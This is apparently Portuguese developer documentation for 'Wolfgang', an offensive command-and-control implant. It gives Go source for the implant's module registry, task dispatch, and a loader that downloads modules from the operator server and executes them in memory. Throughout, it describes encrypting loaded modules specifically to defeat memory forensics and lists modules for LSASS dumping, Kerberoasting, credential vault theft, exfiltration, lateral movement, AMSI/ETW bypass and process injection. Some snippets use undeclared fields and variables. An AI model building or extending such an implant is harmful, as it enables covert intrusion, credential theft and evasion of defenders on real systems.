    Modulos¶

    O sistema de modulos do Wolfgang separa a logica de execucao (o que o implant faz no target) do mecanismo de comunicacao (como dados viajam). Cada modulo implementa uma interface minima de tres metodos, e o runtime decide em tempo de execucao quais modulos estao disponiveis baseado na plataforma.

    Interface Module¶

    // pkg/module/module.go
type Module interface {
    Name() string
    Execute(ctx context.Context, args ModuleArgs) (ModuleResult, error)
    OS() []string
}
    Metodo Descricao
    Name() Identificador unico do modulo (ex: "shell", "recon", "amsi_bypass")
    Execute(ctx, args) Executa a logica do modulo. ctx permite cancelamento por timeout
    OS() Lista de plataformas suportadas. Slice vazio = todas as plataformas

    ModuleArgs e ModuleResult¶

    type ModuleArgs struct {
    Raw    string            `json:"raw"`              // JSON string crua do task dispatch
    Parsed map[string]string `json:"parsed,omitempty"` // parsed sob demanda
}

// ParseRaw deserializa Raw em Parsed quando o modulo precisa de args estruturados
func (a *ModuleArgs) ParseRaw() {
    json.Unmarshal([]byte(a.Raw), &a.Parsed)
}

type ModuleResult struct {
    Output string            `json:"output"`         // resultado principal (texto)
    Data   map[string]string `json:"data,omitempty"` // dados estruturados opcionais
}

    A separacao entre Raw e Parsed permite que modulos simples (como shell) usem o Raw diretamente como comando, enquanto modulos complexos (como exfil) parsem argumentos estruturados.

    Registry — Registro com Filtragem por Plataforma¶

    O Registry e o ponto central de registro e lookup de modulos. A filtragem por plataforma acontece no momento do registro, nao no momento da execucao:

    // pkg/module/module.go
type Registry struct {
    mu      sync.RWMutex
    modules map[string]Module
}

func (r *Registry) RegisterModule(m Module) error {
    if !matchesPlatform(m.OS()) {
        return nil // silently skip — nao e um erro
    }
    r.mu.Lock()
    defer r.mu.Unlock()
    name := m.Name()
    if _, exists := r.modules[name]; exists {
        return fmt.Errorf("module %q already registered", name)
    }
    r.modules[name] = m
    return nil
}

// matchesPlatform: O(n) scan e aceitavel — modulos declaram 1-3 OS entries
func matchesPlatform(supported []string) bool {
    if len(supported) == 0 { return true } // vazio = all platforms
    for _, os := range supported {
        if os == runtime.GOOS { return true }
    }
    return false
}

    Por que filtrar no registro e nao na execucao? Porque modulos Windows-only (como amsi_bypass) importam packages que nem compilam em Linux. A filtragem via //go:build tags nos source files garante que o codigo nem e incluido na compilacao. O matchesPlatform e uma segunda camada de protecao runtime.

    Executor¶

    O Executor encapsula o Registry e adiciona verificacao de contexto:

    type Executor struct {
    registry *Registry
}

func (e *Executor) Execute(ctx context.Context, moduleName string, args ModuleArgs) (ModuleResult, error) {
    if err := ctx.Err(); err != nil {
        return ModuleResult{}, err // contexto ja cancelado
    }
    m := e.registry.GetModule(moduleName)
    if m == nil {
        return ModuleResult{}, ErrModuleNotFound
    }
    return m.Execute(ctx, args)
}

    O ErrModuleNotFound e um sentinela usado pelo implant para decidir se deve tentar o dynamic module loader como fallback.

    Fluxo de Dispatch de Tasks¶

    flowchart TD
    A["Task recebida do server
    {task_id, module, args, agent_id}"] --> B{Executor.Execute}
    B --> C{Registry.GetModule}
    C -->|"Encontrou"| D{Module.OS match?}
    C -->|"Nao encontrou"| E{Dynamic modules
    habilitado?}

    D -->|"Sim"| F["module.Execute(ctx, args)"]
    D -->|"Nao"| G["Ja filtrado no registro
    (nunca chega aqui)"]

    E -->|"Sim"| H["moduleloader.LoadAndExecute()"]
    E -->|"Nao"| I["Return ErrModuleNotFound"]

    F -->|"Sucesso"| J["taskResult{status: completed}"]
    F -->|"Erro"| K["taskResult{status: failed}"]

    H -->|"Download + Verify + Execute"| L["taskResult{status: completed}"]
    H -->|"Falha"| K

    J --> M["Encode envelope + Send result"]
    K --> M
    L --> M

    O bridge entre task dispatch e module execution no implant:

    // cmd/implant/main.go
bridge := func(task taskDispatch) taskResult {
    args := module.ModuleArgs{Raw: task.Args}
    result, err := executor.Execute(ctx, task.Module, args)

    // Fallback para dynamic loading se modulo nao esta no registry estatico
    if errors.Is(err, module.ErrModuleNotFound) && modLoader != nil {
        output, loadErr := modLoader.LoadAndExecute(ctx, task.Module, task.Args)
        if loadErr == nil {
            return taskResult{TaskID: task.TaskID, Status: "completed", Result: output}
        }
    }

    if err != nil {
        return taskResult{TaskID: task.TaskID, Status: "failed", Result: err.Error()}
    }
    return taskResult{TaskID: task.TaskID, Status: "completed", Result: result.Output}
}

    Todos os modulos sao registrados em cmd/implant/modules.go:

    modules := []module.Module{

        cleanupMod,

        // Lateral movement
        &lateral.PortFwdModule{},
        &lateral.SocksModule{},
        &lateral.PivotModule{},
        remote.NewRemoteExecModule(),

        // Credential extraction
        &credential.RegistryHiveModule{},    // Windows
        &credential.LsassDumpModule{},       // Windows
        &credential.KerberoastModule{},      // Windows
        &credential.VaultModule{},           // Windows

        // Exfiltration
        &exfil.ExfilModule{},

        // Evasion
        evasion.NewAMSIBypass(),             // Windows
        evasion.NewETWBypass(),              // Windows
        evasion.NewProcessInjector(),        // Windows
        evasion.NewMemExec(),                // Windows
        evasion.NewDirectSyscall(),          // Windows
        &evasion.NtdllUnhook{},             // Windows
        &evasion.ModuleStomp{},             // Windows
    }

    for _, m := range modules {
        registry.RegisterModule(m) // silently skips wrong OS
    }
}

    Modulos que nao suportam a plataforma do build sao silenciosamente ignorados pelo RegisterModule. Um implant Linux tera apenas: shell, exec, sysinfo, fileops, cron, portfwd, socks, pivot, remote_exec, exfil.

    Dynamic Module Loading¶

    Para modulos que nao sao compilados estaticamente no implant, o Wolfgang oferece loading dinamico sob demanda do server.

    Loader¶

    // pkg/moduleloader/loader.go
type Loader struct {
    cache      *ModuleCache
    serverURL  string
    client     *http.Client
    sessionKey []byte
    agentID    string
}

func (l *Loader) LoadAndExecute(ctx context.Context, moduleName string, args string) (string, error) {
    l.mu.Lock()
    rawModule, ok := l.cache.Get(moduleName)
    if !ok {
        rawModule, err = l.download(ctx, moduleName)
        l.cache.Put(moduleName, rawModule)
    }
    l.mu.Unlock()
    return platformLoadAndExecute(rawModule, args)
}

    Module Cache — Cifrado em Memoria¶

    Modulos baixados sao armazenados cifrados em memoria usando uma chave AES-256 gerada aleatoriamente no boot do implant:

    // pkg/moduleloader/cache.go
type ModuleCache struct {
    entries map[string]cacheEntry
    key     []byte // 32 bytes, gerada com crypto/rand
}

type cacheEntry struct {
    encrypted []byte  // AES-256-GCM ciphertext
    nonce     []byte  // random nonce
    addr      uintptr // endereco de memoria do modulo carregado
    size      uintptr // tamanho do modulo carregado
}

    Por que cifrar o cache? Para dificultar memory forensics. Um dump de memoria do processo nao revela os modulos em plaintext. A chave do cache e diferente da session key — e gerada localmente e nunca sai do processo.

    Integracao com Sleep Encryption¶

    O cache rastreia regioes de memoria onde modulos foram reflectively loaded:

    func (c *ModuleCache) SetRegion(name string, addr, size uintptr) {
    if e, ok := c.entries[name]; ok {
        e.addr = addr
        e.size = size
        c.entries[name] = e
    }
}

func (c *ModuleCache) Regions() []MemoryRegion {
    var regions []MemoryRegion
    for _, entry := range c.entries {
        if entry.addr != 0 && entry.size > 0 {
            regions = append(regions, MemoryRegion{Addr: entry.addr, Size: entry.size})
        }
    }
    return regions
}

    Essas regioes sao incluidas no pass de sleep encryption — quando o implant entra em sleep, o obfuscator cifra nao apenas a heap principal, mas tambem as regioes de modulos carregados dinamicamente.

    Modulos de Server (Storage)¶

    O server armazena modulos compilados no SQLite com chave composta (name, platform, arch):

    CREATE TABLE modules (
    name       TEXT NOT NULL,
    data       BLOB NOT NULL,
    sha256     TEXT NOT NULL,
    version    TEXT NOT NULL DEFAULT '1.0',
    platform   TEXT NOT NULL DEFAULT 'windows',
    arch       TEXT NOT NULL DEFAULT 'amd64',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (name, platform, arch)
);

    Isso permite armazenar o mesmo modulo compilado para multiplas plataformas (ex: mimikatz para windows/amd64 e windows/arm64).
